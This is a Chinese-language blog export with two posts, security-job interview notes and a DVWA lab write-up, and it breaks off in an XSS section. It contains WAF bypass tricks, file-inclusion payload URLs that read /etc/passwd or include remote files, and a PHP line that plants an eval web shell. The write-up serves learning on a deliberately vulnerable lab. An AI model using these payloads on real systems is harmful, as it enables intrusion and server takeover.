<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安全岗面试资料</title>
      <link href="/93956cc7.html"/>
      <url>/93956cc7.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20200227162506.jpg" alt=""></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非原创，收集自用</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>00x01.<a href="https://github.com/mai-lang-chai/Penetration-Testing" rel="external nofollow" target="_blank">渗透测试工程师笔试题/面试题</a></p><p>00x02.<a href="https://www.nowcoder.com/discuss/139226?type=2&amp;order=0&amp;pos=9&amp;page=1" rel="external nofollow" target="_blank">安全岗菜鸡的坎坷秋招路（面经+笔试题分享）</a></p><p>00x03.<a href="https://github.com/SecYouth/sec-jobs" rel="external nofollow" target="_blank">信息安全实习和校招的面经、真题和资料</a></p><p>00x04.<a href="https://blog.csdn.net/tan6600/category_9276566.html" rel="external nofollow" target="_blank">信息安全笔试题集</a></p><p>00x05.<a href="https://blog.csdn.net/sun8890446/article/details/80817071" rel="external nofollow" target="_blank">渗透测试技术题（面试、笔试）</a></p><p>00x06.<a href="https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md#head22" rel="external nofollow" target="_blank">渗透测试面试问题2019版</a></p><p>00x07.<a href="https://dawnnnnnn.com/2019/09/2019%E7%A7%8B%E6%8B%9B-%E5%AE%9E%E4%B9%A0%E5%AE%89%E5%85%A8%E9%9D%A2%E7%BB%8F%E5%8F%8A%E6%80%BB%E7%BB%93/" rel="external nofollow" target="_blank">2019秋招/实习安全面经及总结</a></p><p>00x08.<a href="https://lengjibo.github.io/%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/" rel="external nofollow" target="_blank">安全面试题整理</a></p><p>00x09.<a href="https://www.zhihu.com/question/265250370" rel="external nofollow" target="_blank">面试 Web 安全工程师时会提问什么问题？</a></p><p>00x10.<a href="https://github.com/Leezj9671/Pentest_Interview" rel="external nofollow" target="_blank">Pentest_Interview</a></p><h1 id="面试流程详细版"><a href="#面试流程详细版" class="headerlink" title="面试流程详细版"></a>面试流程详细版</h1><h2 id="00x01-现场面试准备"><a href="#00x01-现场面试准备" class="headerlink" title="00x01 现场面试准备"></a>00x01 现场面试准备</h2><ol><li>简历（打印3份以上，彩色），身份证，毕业证等资料；</li><li>电脑（无线鼠标，电源线等）；</li><li>本子和笔，着装整洁，守时（提前20分钟到）；</li><li>面试公司的认识（地点，公司发展时间戳，部门，面试官等）。</li></ol><h2 id="00x02-对于电话面试"><a href="#00x02-对于电话面试" class="headerlink" title="00x02 对于电话面试"></a>00x02 对于电话面试</h2><ol><li><p>约好时间并提前15分钟找个安静，信号好，没人打扰的地方，注意手机电量；</p></li><li><p>站着进行电话面试，保持微笑，通话可录音；</p></li><li><p>一份简历，本子和笔，耳机等（看着简历来）；</p></li><li><p>先想好，面试官会问的问题及答案，记要点（渗透测试的思路等）。</p></li></ol><h2 id="00x03-面试官问的问题"><a href="#00x03-面试官问的问题" class="headerlink" title="00x03 面试官问的问题"></a>00x03 面试官问的问题</h2><h3 id="Q1-自我介绍"><a href="#Q1-自我介绍" class="headerlink" title="Q1 自我介绍"></a>Q1 自我介绍</h3><p>1）可参照简历<br>2）有条理（三分钟左右）</p><h3 id="Q2-一个授权网站的渗透测试思路，流程（给你一个授权网站，怎么做？）"><a href="#Q2-一个授权网站的渗透测试思路，流程（给你一个授权网站，怎么做？）" class="headerlink" title="Q2 一个授权网站的渗透测试思路，流程（给你一个授权网站，怎么做？）"></a>Q2 一个授权网站的渗透测试思路，流程（给你一个授权网站，怎么做？）</h3><h4 id="1）信息收集"><a href="#1）信息收集" class="headerlink" title="1）信息收集"></a>1）信息收集</h4><p>a. 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）<br>b. 网站指纹识别（包括，cms，cdn，证书等），dns记录<br>c. whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）<br>d. 子域名收集，旁站查询(有授权可渗透)，C段等<br>e. google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等<br>f. 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等<br> i. 传输协议，通用漏洞，exp，github源码等</p><h4 id="2）漏洞挖掘"><a href="#2）漏洞挖掘" class="headerlink" title="2）漏洞挖掘"></a>2）漏洞挖掘</h4><p>1&gt; 浏览网站，看看网站规模，功能，特点等<br>2&gt; 端口，弱口令，目录等扫描<br>3&gt; XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，短信轰炸，服务器漏洞检测，最后使用漏扫工具等</p><h4 id="3）漏洞利用-权限提升"><a href="#3）漏洞利用-权限提升" class="headerlink" title="3）漏洞利用 | 权限提升"></a>3）漏洞利用 | 权限提升</h4><p>a) mysql提权，serv-u提权，linux内核版本提权等</p><h4 id="4）清除测试数据-输出报告"><a href="#4）清除测试数据-输出报告" class="headerlink" title="4）清除测试数据 | 输出报告"></a>4）清除测试数据 | 输出报告</h4><p>i 日志、测试数据的清理<br> ii 总结，输出渗透测试报告，附修复方案</p><h4 id="5-复测"><a href="#5-复测" class="headerlink" title="5) 复测"></a>5) 复测</h4><p>验证并发现是否有新漏洞，输出报告，归档</p><h3 id="Q3-一个APP的逆向分析思路（给你一个APP，怎么做？）"><a href="#Q3-一个APP的逆向分析思路（给你一个APP，怎么做？）" class="headerlink" title="Q3 一个APP的逆向分析思路（给你一个APP，怎么做？）"></a>Q3 一个APP的逆向分析思路（给你一个APP，怎么做？）</h3><p>这里简单列一下app测试的大纲，详细不便放出（可参照OWASP的mstg）：<a href="https://github.com/OWASP/owasp-mstg/" rel="external nofollow" target="_blank">https://github.com/OWASP/owasp-mstg/</a><br>1.代码保护检测；<br>2.数据存储安全；<br>3.加密算法；<br>4.四大组件安全；<br>5.应用规范等</p><h3 id="Q4-简述某一漏洞的原理和渗透手法（SQL注入，XSS，CSRF等）"><a href="#Q4-简述某一漏洞的原理和渗透手法（SQL注入，XSS，CSRF等）" class="headerlink" title="Q4 简述某一漏洞的原理和渗透手法（SQL注入，XSS，CSRF等）"></a>Q4 简述某一漏洞的原理和渗透手法（SQL注入，XSS，CSRF等）</h3><ol><li>SQL注入原理：<a href="https://www.ichunqiu.com/course/54377" rel="external nofollow" target="_blank">https://www.ichunqiu.com/course/54377</a></li><li>XSS原理：<a href="https://www.ichunqiu.com/course/59281" rel="external nofollow" target="_blank">https://www.ichunqiu.com/course/59281</a></li></ol><h3 id="Q5-编程语言"><a href="#Q5-编程语言" class="headerlink" title="Q5 编程语言"></a>Q5 编程语言</h3><p>1.python，JAVA，算法，二进制等编程能力（笔者暂未学，不深入探讨）<br>2.ARM汇编（基本的汇编指令，寄存器等）</p><h3 id="Q6-WAF-bypass"><a href="#Q6-WAF-bypass" class="headerlink" title="Q6 WAF bypass"></a>Q6 WAF bypass</h3><p>1.关键字可以用%（只限IIS系列）。比如select，可以  sel%e%ct<br>2.通杀的，内联注释，如  /<em>!select</em>/<br>3.编码，可两次编码<br>4.multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF<br>5.参数绕过，复制参数，id=1&amp;id=1<br>6.内联注释</p><h3 id="Q7-Kali的使用（Linux系统）"><a href="#Q7-Kali的使用（Linux系统）" class="headerlink" title="Q7 Kali的使用（Linux系统）"></a>Q7 Kali的使用（Linux系统）</h3><p>whatweb   指纹识别<br>dirb  目录扫描<br>whois  whois查询<br>字典生成套件<br>爆破工具<br>kali系统中的工具清单 - 官方介绍</p><h3 id="Q8-OWASP-Top10-2017"><a href="#Q8-OWASP-Top10-2017" class="headerlink" title="Q8 OWASP-Top10-2017"></a>Q8 OWASP-Top10-2017</h3><p>A1 注入，  A2 失效的身份认证，  A3 敏感信息泄露，  A4 XML外部实体(XXE)， A5 失效的访问控制， A6 安全配置错误，  A7 跨站脚本(XSS)，  A8 不安全的反序列化，  A9 使用含有已知漏洞的组件，  A10 不足的日志记录和监控<br>OWASP_Top_10_2017_中文版v1.2.pdf</p><h3 id="Q9-网络安全事件应急响应（如，一业务主站被挂黑页的处理流程及应对方法）"><a href="#Q9-网络安全事件应急响应（如，一业务主站被挂黑页的处理流程及应对方法）" class="headerlink" title="Q9 网络安全事件应急响应（如，一业务主站被挂黑页的处理流程及应对方法）"></a>Q9 网络安全事件应急响应（如，一业务主站被挂黑页的处理流程及应对方法）</h3><ol><li>取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件 - 注意文件的时间，用户，后缀等属性），调取日志（系统日志，中间件日志，WAF日 志等）；</li><li>处理，恢复备份（快照回滚，最近一次），确定入侵方法（漏洞检测，并进行修复）</li><li>溯源，查入侵IP，入侵手法的确定等</li><li>记录，归档——–预防-事件检测-抑制-根除-恢复-跟踪-记录<br>通用漏洞的应对等其他安全应急事件</li></ol><h3 id="Q10-提交过的漏洞"><a href="#Q10-提交过的漏洞" class="headerlink" title="Q10 提交过的漏洞"></a>Q10 提交过的漏洞</h3><p> 国内外的漏洞提交平台，各SRC等</p><h3 id="Q11-其他优势"><a href="#Q11-其他优势" class="headerlink" title="Q11 其他优势"></a>Q11 其他优势</h3><p>1.新兴技术的研究（IOT安全，区块链，人工智能，机器学习等）<br>2.个人博客（原创文章），投稿，人脉，安全峰会，安全研究Paper, 安全议题分享等<br>3.比赛（CTF，团队比赛等），线下培训<br>4.在校经历（获奖，个人项目，团队活动，担任学生干部等）<br>5.英语 CET-4，CET-6</p><h3 id="Q12-读过的技术书籍（学习的途径）"><a href="#Q12-读过的技术书籍（学习的途径）" class="headerlink" title="Q12 读过的技术书籍（学习的途径）"></a>Q12 读过的技术书籍（学习的途径）</h3><p>《白帽子讲web安全》、《ios应用逆向工程-第2版》、《加密与解密-第3版》、《汇编语言-第2版》、《OWASP-MSTG》</p><h2 id="00x04-问面试官的问题"><a href="#00x04-问面试官的问题" class="headerlink" title="00x04 问面试官的问题"></a>00x04 问面试官的问题</h2><p>q1 贵公司，信息安全部门的规模，发展等<br>q2 任职后的工作职责，内容，出差，时间等<br>q3 劳动合同（实习生签三方协议和转正问题），是否解决户口<br>q4 薪资（税后），奖金，股票期权，福利，活动等</p><h2 id="00x05-面试总结"><a href="#00x05-面试总结" class="headerlink" title="00x05 面试总结"></a>00x05 面试总结</h2><ol><li>记录面试官的问题和自己的回答</li><li>查漏补缺</li><li>收获</li></ol>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全岗找工作 </tag>
            
            <tag> 渗透测试工程师 </tag>
            
            <tag> WEB安全工程师 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习</title>
      <link href="/23082ae8.html"/>
      <url>/23082ae8.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20191214114439.jpg" alt=""></p><a id="more"></a><h1 id="DVWA学习"><a href="#DVWA学习" class="headerlink" title="DVWA学习"></a>DVWA学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在B站看到了这个40集的web安全渗透教程，便看 了下，前半部分是以DVWA靶场为实验讲解，后半段是讲的工具使用，在实战过程中大流量工具用途不大。我就简单的了解了一下，此处没有进行记录。本文主要是刷<code>DVWA</code>靶场记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DVWA共有十个模块</span><br><span class="line">1.Brute Force(爆破)</span><br><span class="line">2.Command Injection（命令注入）</span><br><span class="line">3.CSRF(跨站请求伪造)</span><br><span class="line">4.File Inclusion（文件包含）</span><br><span class="line">5.File Uplod（文件上传）</span><br><span class="line">6.Insecure CAPTCHA(不安全的验证码)</span><br><span class="line">7.SQL Inj（SQL注入）</span><br><span class="line">8.SQL B Inj（SQL盲注）</span><br><span class="line">9.XSS-ref（反射型xss）</span><br><span class="line">10.xss-stored（存储型xss）</span><br></pre></td></tr></table></figure><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>视频资源：<a href="https://www.bilibili.com/video/av51916985" rel="external nofollow" target="_blank">哔哩哔哩</a></p><p>网盘资源：<a href="https://pan.baidu.com/s/1d5cv2GoR1MKn_ZDxrNVyCg?errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0&amp;traceid=#list/path=%2F" rel="external nofollow" target="_blank">链接地址</a></p><p>靶机下载：<a href="https://sourceforge.net/projects/owaspbwa/files/" rel="external nofollow" target="_blank">owaspbwa</a></p><h2 id="文件上传实验"><a href="#文件上传实验" class="headerlink" title="文件上传实验"></a>文件上传实验</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p><code>DVWA</code>靶场</p><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><p>级别：<code>low</code>,无过滤，直接上传<code>php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><p>级别：<code>Medium</code>,判断MINE值，上传图片，抓包修改后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h3><p>级别：<code>high</code>,上传图片马结合文件包含利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件包含实验"><a href="#文件包含实验" class="headerlink" title="文件包含实验"></a>文件包含实验</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">File Inclusion，即文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</span><br><span class="line">本地文件包含 LFI</span><br><span class="line">http://xxx/index.php?page=xx.php</span><br><span class="line">远程文件包含 RFI</span><br><span class="line">http://xxx/index.php?page=http://web_server/xxx.php</span><br></pre></td></tr></table></figure><h3 id="实验一-1"><a href="#实验一-1" class="headerlink" title="实验一"></a>实验一</h3><p>级别：<code>low</code></p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:/xxxx/vulnerabilities/fi/?page=/etc/passwd</span><br><span class="line">http://xxxx/vulnerabilities/fi/?page=/var/www/html/hackable/uploads/low1.jpg</span><br><span class="line">http://xxxx/vulnerabilities/fi/?page=http://xxxx/1.txt</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fputs(fopen(<span class="string">"test.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php eval($_POST['</span>a<span class="string">']);?&gt;'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实验二-1"><a href="#实验二-1" class="headerlink" title="实验二"></a>实验二</h3><p>级别：<code>medium</code></p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了下面字符,所以对采用绝对路径的方式包含文件是不会受到任何限制的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:// ,   https://   ,    ../   ,   ..\</span><br></pre></td></tr></table></figure><p>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/vulnerabilities/fi/?page=..././..././hackable/uploads/1.txt</span><br><span class="line">http://xxxx/vulnerabilities/fi/?page=hthttp://tp://xxx/1.txt</span><br><span class="line">http:/xxxx/vulnerabilities/fi/?page=/etc/passwd</span><br></pre></td></tr></table></figure><h3 id="实验三-1"><a href="#实验三-1" class="headerlink" title="实验三"></a>实验三</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn't the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>High级别的代码规定只能包含file开头的文件，可以利用file协议绕过防护策略。</p><ul><li>Tips：因为fnmatch函数适用于PHP &gt;= 4.3.0，因此php版本高于这个才能利用，否则会出现打不开high等级页面。</li></ul><p>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/1.txt</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.jianshu.com/p/2a1f2f79c1cd" rel="external nofollow" target="_blank">简书</a></p><h2 id="XSS实验"><a href="#XSS实验" class="headerlink" title="XSS实验"></a>XSS实验</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><h4 id="常用的HTML标签"><a href="#常用的HTML标签" class="headerlink" title="常用的HTML标签"></a>常用的HTML标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt; </span><br><span class="line">iframe元素会创建包含另外一个文档的内联框架（即行内框架）。</span><br><span class="line"></span><br><span class="line">&lt;textarea&gt; </span><br><span class="line">textarea标签定义多行的文本输入控件。</span><br><span class="line"></span><br><span class="line">&lt;img&gt; </span><br><span class="line">img元素向网页中嵌入一幅图像。</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">&lt;script&gt;标签用于定义客户端脚本，比如JavaScript。script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件。必需的 